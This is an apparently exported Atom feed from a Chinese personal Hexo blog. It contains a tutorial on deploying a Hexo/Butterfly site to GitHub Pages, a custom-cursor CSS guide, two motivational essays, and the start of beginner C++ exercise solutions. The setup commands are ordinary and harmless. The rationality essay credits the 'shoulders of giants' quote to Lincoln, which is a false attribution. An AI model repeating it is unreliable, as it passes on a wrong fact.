    <content type="html"><![CDATA[<h1 id="利用开源的Hexo框架-Butterfly主题-Github静态资源实现搭建个人博客网站"><a href="#利用开源的Hexo框架-Butterfly主题-Github静态资源实现搭建个人博客网站" class="headerlink" title="利用开源的Hexo框架+Butterfly主题+Github静态资源实现搭建个人博客网站"></a>利用开源的Hexo框架+Butterfly主题+Github静态资源实现搭建个人博客网站</h1><blockquote><p>本文目的是供<code>互联网IT业界伙伴们</code>和<code>对前端感兴趣的朋友们</code>使用Github仓库的静态资源搭建个人博客网站。<br>参考文章：<a href="https://zhuanlan.zhihu.com/p/688070849%E3%80%81https://juejin.cn/post/6844904039457488910%E3%80%82">https://zhuanlan.zhihu.com/p/688070849、https://juejin.cn/post/6844904039457488910。</a></p></blockquote><p>步骤：</p><h1 id="一、本地配置"><a href="#一、本地配置" class="headerlink" title="一、本地配置"></a>一、本地配置</h1><h2 id="1-安装Node-js"><a href="#1-安装Node-js" class="headerlink" title="1.安装Node.js"></a>1.安装Node.js</h2><p>(1).首先去官网下载，自己利用搜索引擎搜索<code>nodejs官网</code>，因为网址可能随时间产生变化；我目前搜到的官网是：<a href="https://nodejs.org/en%EF%BC%8C%E7%9B%B4%E6%8E%A5%E9%80%89%E6%8B%A9LTS%E7%89%88%E6%9C%AC%E5%AE%89%E8%A3%85%E3%80%82">https://nodejs.org/en，直接选择LTS版本安装。</a></p><p>(2).下载完成后直接双击打开安装，基本上全部下一步就行。</p><p>(3).一般情况下，安装时默认安装在C盘，我们可以改一下安装位置，改到D盘<code>D:\nodejs\</code>。最后点击<code>Install</code>耐心的等待安装完成即可。</p><p><code>Win</code>键+<code>R</code>键打开运行窗口并输入<code>cmd</code>，如果打不开就按一下<code>F9</code>键。输入cmd打开命令行窗口之后输入<code>node -v</code>,出现版本号即为安装成功；反之，重新安装nodejs。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node -v</span><br></pre></td></tr></table></figure><p>图片演示（可跳过）：</p><p><img src="/img/boke1.png"></p><p><img src="/img/boke2.png"></p><p><img src="/img/boke3.png"></p><p><img src="/img/boke4.png"></p><p><img src="/img/boke5.png"></p><p><img src="/img/boke6.png"></p><h2 id="2-安装Git"><a href="#2-安装Git" class="headerlink" title="2.安装Git"></a>2.安装Git</h2><p>打开Git官网下载页面，自己利用搜索引擎搜索官网，因为网址可能随时间产生变化；我目前搜到的官网是：<a href="https://git-scm.com/downloads">https://git-scm.com/downloads</a> ，选择自己系统进行下载。</p><p><img src="/img/boke7.png"></p><p><img src="/img/boke8.png"></p><p>下载完成后，直接全程下一步进行安装，步骤有点多，我就不一步步贴图了。（建议也安装在其他盘，不要安装在C盘）</p><p>安装好后，打开cmd打开命令行窗口，输入<code>git --version</code> ,出现版本号则说明安装成功。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git --version</span><br></pre></td></tr></table></figure><p>此时我们回到桌面，点击鼠标右键就会出现:<code>Open Git Bush here</code>, 如果没有就点击<code>更多</code>或<code>显示更多选项</code>即可看见。</p><p><img src="/img/boke9.png"></p><h2 id="3-安装配置Hexo"><a href="#3-安装配置Hexo" class="headerlink" title="3.安装配置Hexo"></a>3.安装配置Hexo</h2><p>(1).安装hexo</p><p>首先，我们建立一个文件夹 比如在D盘建立一个Hexo_blog文件夹，建立好后打开文件夹，点击鼠标右键点击<code>在终端中打开</code></p><p><img src="/img/boke10.png"></p><p>然后输入以下命令行下载安装Hexo</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure><p>(2).初始化</p><p>在Hexo_blog文件夹中，鼠标右键点击<code>在终端中打开</code>，输入以下命令行进行初始化</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo init Hexo_blog</span><br></pre></td></tr></table></figure><p>命令执行完成后，将在Hexo_blog文件夹中生成相应的文件，目录如下：</p><p><img src="/img/boke11.png"></p><p>(3).本地部署</p><p>在Hexo_blog文件夹中，鼠标右键点击<code>Open Git Bush here</code></p><p>紧接着输入以下命令生成静态页面</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo g</span><br></pre></td></tr></table></figure><p>输入以下命令启动server</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo s</span><br></pre></td></tr></table></figure><p>打开浏览器，输入网址: <a href="http://localhost:4000/">http://localhost:4000</a> ，即可看到hexo生成的静态页面。</p><p><code>Ctrl</code>建+点击鼠标左键点一下生成的链接，即可自动从浏览器打开Hexo生成的静态页面。</p><p>如果打不开，需重置端口。谷歌一下，即可搜到解决方案。</p><p>接着输入 <code>npm install</code> 安装所需要的文件。</p><h1 id="二、挑选并应用主题"><a href="#二、挑选并应用主题" class="headerlink" title="二、挑选并应用主题"></a>二、挑选并应用主题</h1><p>默认的主题可能并不是我们想要的效果，那么就可以通过更换主题来实现。可以在官网的主题页面选择想要的主题。这里，选择Butterfly主题来应用。</p><h2 id="1-主题安装"><a href="#1-主题安装" class="headerlink" title="1.主题安装"></a>1.主题安装</h2><p>可通过以下命令安装主题:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone -b master https://github.com/jerryc127/hexo-theme-butterfly.git themes/Butterfly</span><br></pre></td></tr></table></figure><h2 id="2-配置butterfly主题"><a href="#2-配置butterfly主题" class="headerlink" title="2.配置butterfly主题"></a>2.配置butterfly主题</h2><p>接着我们打开hexo_blog文件夹下的<code>_config.yml</code>配置文件</p><p><img src="/img/boke12.png"></p><p>点开，拉到最下面，找到这个配置，并把它改成<code>butterfly</code></p><p><img src="/img/boke13.png"></p><p>此时我们再去Git Bash命令窗口执行 <code>hexo g</code> 和 <code>hexo s</code> 命令。</p><p>发现会报一个错 <code>extends includes/layout.pug block content include ./includes/mixins/post-ui.pug #recent-posts.recent-posts +postUI include includes/pagination.pug</code>，这是因为此时我们的项目还缺少依赖，把hexo_blog文件夹在终端打开执行下面的命令安装:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-renderer-pug hexo-renderer-stylus</span><br></pre></td></tr></table></figure><p>安装完成后再次执行 <code>hexo g</code> 和 <code>hexo s</code> 命令重新打开我们的项目就会发现，butterfly主题已经配置成功。</p><p>如果需要配置其他主题，可以到hexo主题网站去找。（建议选择支持中文的，后期好改）</p><h1 id="三、部署到Github仓库"><a href="#三、部署到Github仓库" class="headerlink" title="三、部署到Github仓库"></a>三、部署到Github仓库</h1><h2 id="1-新建github仓库"><a href="#1-新建github仓库" class="headerlink" title="1.新建github仓库"></a>1.新建github仓库</h2><p>打开我们的GitHub（没有账号的话，先去注册一个） <a href="https://github.com/">https://github.com/</a> 。<br>注册登录好后，点击右上角我们的头像，新建一个仓库</p><p><img src="/img/boke14.png"></p><p><img src="/img/boke15.png"></p><p>命名为 <code>username.github.io</code>（username是你的账号），这里要注意。还有就是新建的仓库一定要选择为<code>Public</code>，并且要勾选<code>Add a README file</code>不然待会我们的项目是访问不了的。点击下方按钮确认创建仓库。<br><img src="/img/boke16.png"></p><h2 id="2-配置hexo部署插件内容"><a href="#2-配置hexo部署插件内容" class="headerlink" title="2.配置hexo部署插件内容"></a>2.配置hexo部署插件内容</h2><p>首先确保安装了 hexo-deployer-git 插件（一般是没有的），如果没有，需要执行命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><p>安装插件（待会本地项目生成静态文件部署到github需要执行命令）</p><p>接着打开我们hexo博客项目的配置文件<code>_config.yml</code> ，在最底部找到<code>deploy</code>配置项，修改成下面的内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line"> type: git</span><br><span class="line"> repo: git@github.com:username/username.github.io.git #username是你的账号名，username.github.io是你的仓库名</span><br><span class="line"> branch: main #现在github默认是main分支</span><br></pre></td></tr></table></figure><p>github默认branch是<code>main</code>分支，如果出问题了，此处的<code>main</code>就要改成<code>master</code>，对应的GitHub仓库<code>Setting</code>里的branch里面的<code>main</code>也要改成<code>master</code>。</p><p>图片演示（可跳过）：<br><img src="/img/boke17.png"></p><p>返回Git Bash命令行窗口，依次执行以下代码:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo generate （可以简化成 hexo g ）</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo deploy （可以简化成 hexo d ）</span><br></pre></td></tr></table></figure><p>将hexo_blog里面的<code>public</code>文件提交到GitHub即可。</p><p>然后浏览器中输入 <code>你的GitHub用户名.github.io</code> 即可看到刚刚部署的博客，如果没有出现的话，可以稍微等一会延迟。</p><h1 id="至此，Hexo-Butterfly-Github搭建博客就大功告成了！"><a href="#至此，Hexo-Butterfly-Github搭建博客就大功告成了！" class="headerlink" title="至此，Hexo+Butterfly+Github搭建博客就大功告成了！"></a>至此，Hexo+Butterfly+Github搭建博客就大功告成了！</h1><h1 id="You-success"><a href="#You-success" class="headerlink" title="You success!"></a>You success!</h1><p>顺便说一下，如果需要绑定域名配置的话，请自行利用谷歌搜索引擎搜索，善于利用搜索引擎检索并解决问题是每一个程序员的必备技能。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;利用开源的Hexo框架-Butterfly主题-Github静态资源实现搭建个人博客网站&quot;&gt;&lt;a href=&quot;#利用开源的Hexo框架-Butterfly主题-Github静态资源实现搭建个人博客网站&quot; class=&quot;headerlink&quot; title=&quot;利用开源</summary>
      
    
    
    
    <category term="关于本站、博客搭建" scheme="http://jiangnanpsalter.com/categories/%E5%85%B3%E4%BA%8E%E6%9C%AC%E7%AB%99%E3%80%81%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
    
    
    <category term="Hexo" scheme="http://jiangnanpsalter.com/tags/Hexo/"/>
    
    <category term="GitHub" scheme="http://jiangnanpsalter.com/tags/GitHub/"/>
    
    <category term="Domain" scheme="http://jiangnanpsalter.com/tags/Domain/"/>
    
    <category term="Butterfly" scheme="http://jiangnanpsalter.com/tags/Butterfly/"/>
    
  </entry>
  
  <entry>
    <title>理性和自驱力，自律与独立</title>
    <link href="http://jiangnanpsalter.com/2024/04/05/%E7%90%86%E6%80%A7%E5%92%8C%E8%87%AA%E9%A9%B1%E5%8A%9B%EF%BC%8C%E8%87%AA%E5%BE%8B%E4%B8%8E%E7%8B%AC%E7%AB%8B/"/>
    <id>http://jiangnanpsalter.com/2024/04/05/%E7%90%86%E6%80%A7%E5%92%8C%E8%87%AA%E9%A9%B1%E5%8A%9B%EF%BC%8C%E8%87%AA%E5%BE%8B%E4%B8%8E%E7%8B%AC%E7%AB%8B/</id>
    <published>2024-04-05T09:35:19.997Z</published>
    <updated>2024-04-05T11:12:14.395Z</updated>
    
    <content type="html"><![CDATA[<h1 id="理性和自驱力，自律与独立"><a href="#理性和自驱力，自律与独立" class="headerlink" title="理性和自驱力，自律与独立"></a>理性和自驱力，自律与独立</h1><p>首先，<code>理性是我们行动的指南</code>。在这个纷繁复杂的世界里，保持理性能够让我们更加明确目标，避免盲目行事。理性使我们能够分析问题、制定解决方案，并在困境中保持冷静和信心。正如哲学家<br>Descartes所说：“我思，故我在。”理性让我们成为独立的个体，拥有独特的价值观和思考方式。</p><p>其次，<code>自驱力是我们前进的动力</code>。在追求目标的过程中，我们需要坚定的信念和不懈的努力。自驱力使我们克服困难和挫折，勇往直前。正如美国总统林肯所说：“我之所以成功，是因为我站在巨人的肩膀上。” 自驱力让我们不断提升自己，实现更高的成就。</p><p>再者，欣赏他人的优点是我们人际关系中不可或缺的一环。每个人都有自己的闪光点，学会欣赏他人的优点不仅能增进友谊，还能让我们从中学习到许多有益的知识和经验。摒弃嫉妒，拥抱欣赏，我们将收获更多的快乐和成长。</p><p>嫉妒，如同一道阴霾，遮蔽了我们看待世界的目光。它让我们陷入无尽的比较和痛苦，使我们无法专注于自己的道路和梦想。唯有摒弃嫉妒，我们才能洗净心中的尘埃，让阳光照进心灵。</p><p>摒弃嫉妒，首先是对自己的一种解放。当我们不再嫉妒他人的成就，便能更好地认识自己，发掘自己的潜能，勇敢地追求属于自己的目标。正如莎士比亚所说：“嫉妒是心灵的毒药。”唯有摒弃嫉妒，我们才能拯救自己的灵魂，踏上真正的成长之路。</p><p>其次，摒弃嫉妒有助于我们建立和谐的人际关系。嫉妒让我们心生恶念，破坏友谊，伤害他人。当我们学会尊重他人，欣赏他们的优点和成就，便能建立起真诚、互助的人际关系。正如我国古人所言：“三人行，必有我师。” 摒弃嫉妒，让我们学会与他人共同进步。</p><p>由此观之，<code>摒弃嫉妒不仅是对民众的一种解放，更是一种心灵上的自律，是有关内在修养的协调和稳定。</code></p><p>再者，摒弃嫉妒有助于社会的和谐发展。嫉妒如同病毒，蔓延至社会各个角落，导致矛盾激化、冲突不断。若要实现社会和谐，我们需<code>从个人做起，摒弃嫉妒，传递正能量。只有这样，我们才能共同创造一个美好的未来。</code></p><p>此外，关于<code>人与人之间的独立性</code>，事实确实如此。我们都是独立的个体，拥有自己的思想、情感和行为。尽管我们生活在一个社会中，但每个人都需要学会独立思考，明确自己的价值观和目标。只有这样，我们才能在这个瞬息万变的世界中保持自我，实现真正的成长。</p><p>最后，<code>每个人都是独立的个体</code>的观点深入人心。确实，<code>别人的事情与我们无关，我们应专注于自己的生活和事业。</code> 每个人的成长和经历都是独特的，我们需要<code>尊重这种差异</code>，避免对他人事务过分干涉。</p><p><code>[理性和自驱力，自律与独立]</code>能让我们更加珍惜当下。生活中，我们常常为他人的成功而懊恼，为得不到的东西而痛苦。然而，时光荏苒，生命短暂。让我们学会珍惜眼前的幸福和快乐，拥抱每一个美好的瞬间。</p><p>愿我们能携手共创美好未来，让心灵沐浴在阳光之中。愿我们如同璀璨的星辰，照亮彼此的人生。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;理性和自驱力，自律与独立&quot;&gt;&lt;a href=&quot;#理性和自驱力，自律与独立&quot; class=&quot;headerlink&quot; title=&quot;理性和自驱力，自律与独立&quot;&gt;&lt;/a&gt;理性和自驱力，自律与独立&lt;/h1&gt;&lt;p&gt;首先，&lt;code&gt;理性是我们行动的指南&lt;/code&gt;。在这个</summary>
      
    
    
    
    <category term="博主的观点和态度" scheme="http://jiangnanpsalter.com/categories/%E5%8D%9A%E4%B8%BB%E7%9A%84%E8%A7%82%E7%82%B9%E5%92%8C%E6%80%81%E5%BA%A6/"/>
    
    
  </entry>
  
  <entry>
    <title>hexo+butterfly主题利用css部署网站鼠标指针样式</title>
    <link href="http://jiangnanpsalter.com/2024/04/05/hexo+butterfly%E4%B8%BB%E9%A2%98%E5%88%A9%E7%94%A8css%E9%83%A8%E7%BD%B2%E7%BD%91%E7%AB%99%E9%BC%A0%E6%A0%87%E6%8C%87%E9%92%88%E6%A0%B7%E5%BC%8F/"/>
    <id>http://jiangnanpsalter.com/2024/04/05/hexo+butterfly%E4%B8%BB%E9%A2%98%E5%88%A9%E7%94%A8css%E9%83%A8%E7%BD%B2%E7%BD%91%E7%AB%99%E9%BC%A0%E6%A0%87%E6%8C%87%E9%92%88%E6%A0%B7%E5%BC%8F/</id>
    <published>2024-04-05T08:51:16.637Z</published>
    <updated>2024-04-05T14:56:49.936Z</updated>
    
    <content type="html"><![CDATA[<h1 id="hexo-butterfly主题利用css部署网站鼠标指针样式"><a href="#hexo-butterfly主题利用css部署网站鼠标指针样式" class="headerlink" title="hexo+butterfly主题利用css部署网站鼠标指针样式"></a>hexo+butterfly主题利用css部署网站鼠标指针样式</h1><h2 id="步骤-五步走："><a href="#步骤-五步走：" class="headerlink" title="步骤-五步走："></a>步骤-五步走：</h2><h3 id="1-下载鼠标指针"><a href="#1-下载鼠标指针" class="headerlink" title="1.下载鼠标指针"></a>1.下载鼠标指针</h3><p>利用搜索引擎搜索并下载自己钟意的鼠标指针，这里推荐去<code>致美化网站</code>进行点击下载：<a href="https://zhutix.com/tag/cursors/">https://zhutix.com/tag/cursors/</a></p><p><img src="/img/cursor1.png"></p><h3 id="2-保存鼠标指针图片"><a href="#2-保存鼠标指针图片" class="headerlink" title="2.保存鼠标指针图片"></a>2.保存鼠标指针图片</h3><p>将cursor格式<code>.cur</code>的鼠标指针图片选两张分别命名为<code>anormal.cur</code>和<code>apointer.cur</code>放进<code>hexo_blog\themes\butterfly\source\img</code>路径下。</p><p><img src="/img/cursor2.png"></p><h3 id="3-创建css"><a href="#3-创建css" class="headerlink" title="3.创建css"></a>3.创建css</h3><p>在本地博客<code>hexo_blog\themes\butterfly\source\css</code>路径下创建<code>cursors.css</code>并将以下代码复制粘贴到<code>cursors.css</code>中进行保存。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line">    <span class="attribute">cursor</span>:<span class="built_in">url</span>(<span class="string">&#x27; /img/anormal.cur&#x27;</span>),</span><br><span class="line">          default;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="selector-tag">a</span>,</span><br><span class="line">  <span class="selector-tag">img</span> &#123;</span><br><span class="line">    <span class="attribute">cursor</span>:<span class="built_in">url</span>(<span class="string">&#x27; /img/apointer.cur&#x27;</span>),</span><br><span class="line">          default;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>图片演示（可跳过）：<br><img src="/img/cursor3.png"><br><img src="/img/cursor4.png"></p><h3 id="4-yml代码注入-Inject"><a href="#4-yml代码注入-Inject" class="headerlink" title="4.yml代码注入-Inject"></a>4.yml代码注入-<code>Inject</code></h3><p>打开站点butterfly主题的config配置文件<code>_config.butterfly.yml</code>或<code>_config.yml</code>，找到inject，在head处直接引入该文件：</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="string">&lt;link</span> <span class="string">rel=&quot;stylesheet&quot;</span> <span class="string">href=&quot;</span> <span class="string">/css/cursors.css&quot;&gt;</span></span><br></pre></td></tr></table></figure><p>图片演示（可跳过）：</p><p><img src="/img/cursor5.png"></p><p><img src="/img/cursor6.png"></p><h3 id="5-部署"><a href="#5-部署" class="headerlink" title="5.部署"></a>5.部署</h3><p>在hexo根目录点击鼠标右键选择<code>Open Git Bush here</code>，输入以下代码进行部署：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo g</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo s</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo g -d</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo d</span><br></pre></td></tr></table></figure><p>最后，在GitHub上面提交public文件即可完成部署。</p><p>图片演示（可跳过）：</p><p><img src="/img/cursor7.png"></p><p><code>hexo g -d</code> 和 <code>hexo d</code>与上图同理，不再用图片演示。 </p><h4 id="Okay-you-success！"><a href="#Okay-you-success！" class="headerlink" title="Okay, you success！"></a>Okay, you success！</h4>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;hexo-butterfly主题利用css部署网站鼠标指针样式&quot;&gt;&lt;a href=&quot;#hexo-butterfly主题利用css部署网站鼠标指针样式&quot; class=&quot;headerlink&quot; title=&quot;hexo+butterfly主题利用css部署网站鼠标指针样</summary>
      
    
    
    
    <category term="关于本站、博客搭建" scheme="http://jiangnanpsalter.com/categories/%E5%85%B3%E4%BA%8E%E6%9C%AC%E7%AB%99%E3%80%81%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
    
    
  </entry>
  
  <entry>
    <title>内在和外在的启示</title>
    <link href="http://jiangnanpsalter.com/2024/04/03/%E5%86%85%E5%9C%A8%E5%92%8C%E5%A4%96%E5%9C%A8%E7%9A%84%E5%90%AF%E7%A4%BA/"/>
    <id>http://jiangnanpsalter.com/2024/04/03/%E5%86%85%E5%9C%A8%E5%92%8C%E5%A4%96%E5%9C%A8%E7%9A%84%E5%90%AF%E7%A4%BA/</id>
    <published>2024-04-03T10:14:35.535Z</published>
    <updated>2024-04-04T19:49:28.858Z</updated>
    
    <content type="html"><![CDATA[<h1 id="内在和外在的启示"><a href="#内在和外在的启示" class="headerlink" title="内在和外在的启示"></a>内在和外在的启示</h1><p>在这个物欲横流的世界，人们往往追求表面的奢华，却忽视了真正的品质。</p><p>无论预算有限还是充足，我们都应关注物品的<code>质量和质感</code>，而非盲目追求高价和奢侈品。</p><p>奢侈品在某种程度上代表着<code>身份和地位</code>，但<code>真正的气质并非仅仅依赖于物质</code>；但你要是预算充足且你自己想购买，那你想买就买呗，无需在乎他人的看法，都无所谓的；</p><p>只是说我们更应该关注的是<code>内心的修养</code>、<code>优秀的品质</code> 以及<code>对他人的尊重</code>。这些无形的财富，才是我们真正值得追求和传承的。<code>让优秀成为一种习惯。</code></p><hr><p>在此附上一张我等地铁时拍的照片（平时不这么穿，那天去迪士尼乐园游玩时就穿的个性化了一些。我感觉还是挺好看的。）</p><p><img src="/img/ditie.jpg"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;内在和外在的启示&quot;&gt;&lt;a href=&quot;#内在和外在的启示&quot; class=&quot;headerlink&quot; title=&quot;内在和外在的启示&quot;&gt;&lt;/a&gt;内在和外在的启示&lt;/h1&gt;&lt;p&gt;在这个物欲横流的世界，人们往往追求表面的奢华，却忽视了真正的品质。&lt;/p&gt;
&lt;p&gt;无论预算有</summary>
      
    
    
    
    <category term="博主的观点和态度" scheme="http://jiangnanpsalter.com/categories/%E5%8D%9A%E4%B8%BB%E7%9A%84%E8%A7%82%E7%82%B9%E5%92%8C%E6%80%81%E5%BA%A6/"/>
    
    
  </entry>
  
  <entry>
    <title>选择结构程序设计</title>
    <link href="http://jiangnanpsalter.com/2024/04/01/%E9%80%89%E6%8B%A9%E7%BB%93%E6%9E%84%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/"/>
    <id>http://jiangnanpsalter.com/2024/04/01/%E9%80%89%E6%8B%A9%E7%BB%93%E6%9E%84%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/</id>
    <published>2024-03-31T17:12:11.496Z</published>
    <updated>2024-04-04T20:22:12.428Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>题目来源：牛客竞赛语法入门班选择结构习题<br>题目链接：<a href="https://ac.nowcoder.com/acm/contest/19304?from=acdiscuss">https://ac.nowcoder.com/acm/contest/19304?from=acdiscuss</a><br>2021-08-13 15:00:00 至 2021-08-17 22:00:00<br>时长: 4天7小时</p></blockquote><h1 id="选择结构程序设计"><a href="#选择结构程序设计" class="headerlink" title="选择结构程序设计"></a>选择结构程序设计</h1><h1 id="A-比大小"><a href="#A-比大小" class="headerlink" title="A 比大小"></a>A 比大小</h1><blockquote><p>时间限制：C&#x2F;C++ 1秒，其他语言2秒<br>空间限制：C&#x2F;C++ 262144K，其他语言524288K<br>64bit IO Format: %lld</p></blockquote><h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h1><p>比较整数a和整数b的大小。<br>输入描述:<br>输入一行两个整数，由空格隔开，分别代表整数a、b的值<br>(1&lt;&#x3D;a,b&lt;&#x3D;10000)</p><h1 id="输出描述"><a href="#输出描述" class="headerlink" title="输出描述:"></a>输出描述:</h1><p>若a比b小，输出”&lt;”<br>若a与b相等，输出”&#x3D;”<br>若a比b大，输出”&gt;”<br>实际输出中，不包含双引号</p><h1 id="示例1"><a href="#示例1" class="headerlink" title="示例1"></a>示例1</h1><h2 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="number">2</span></span><br></pre></td></tr></table></figure><h2 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;</span><br></pre></td></tr></table></figure><h1 id="示例2"><a href="#示例2" class="headerlink" title="示例2"></a>示例2</h1><h2 id="输入-1"><a href="#输入-1" class="headerlink" title="输入"></a>输入</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="输出-1"><a href="#输出-1" class="headerlink" title="输出"></a>输出</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">=</span><br></pre></td></tr></table></figure><h1 id="示例3"><a href="#示例3" class="headerlink" title="示例3"></a>示例3</h1><h2 id="输入-2"><a href="#输入-2" class="headerlink" title="输入"></a>输入</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="输出-2"><a href="#输出-2" class="headerlink" title="输出"></a>输出</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;</span><br></pre></td></tr></table></figure><h1 id="AC-Code"><a href="#AC-Code" class="headerlink" title="AC Code"></a>AC Code</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;bits/stdc++.h&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> a, b;</span><br><span class="line">    cin &gt;&gt; a &gt;&gt; b;</span><br><span class="line">    <span class="keyword">if</span> (a &lt; b) cout &lt;&lt; <span class="string">&quot;&lt;&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (a == b) cout &lt;&lt; <span class="string">&quot;=&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">else</span> cout &lt;&lt; <span class="string">&quot;&gt;&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="B-卡拉兹函数"><a href="#B-卡拉兹函数" class="headerlink" title="B 卡拉兹函数"></a>B 卡拉兹函数</h1><blockquote><p>时间限制：C&#x2F;C++ 1秒，其他语言2秒<br>空间限制：C&#x2F;C++ 131072K，其他语言262144K<br>64bit IO Format: %lld</p></blockquote><h1 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h1><p>　卡拉兹函数是怎么回事呢？卡拉兹相信大家都很熟悉，但是卡拉兹函数是怎么回事呢，下面就让小编带大家一起了解吧。<br>卡拉兹函数，其实就是当n是奇数时，输出3*n+1，当n是偶数时，输出n&#x2F;2，大家可能会很惊讶卡拉兹怎么会是函数呢？但事实就是这样，小编也感到非常惊讶。<br>这就是关于卡拉兹函数的事情了，大家有什么想法呢，欢迎在评论区告诉小编一起讨论哦！</p><h1 id="输入描述"><a href="#输入描述" class="headerlink" title="输入描述:"></a>输入描述:</h1><p>一个不超过105的正整数n</p><h1 id="输出描述-1"><a href="#输出描述-1" class="headerlink" title="输出描述:"></a>输出描述:</h1><p>一行一个整数k。当n是奇数时，k&#x3D;3*n+1，当n是偶数时，k&#x3D;n&#x2F;2。</p><h1 id="示例1-1"><a href="#示例1-1" class="headerlink" title="示例1"></a>示例1</h1><h2 id="输入-3"><a href="#输入-3" class="headerlink" title="输入"></a>输入</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure><h2 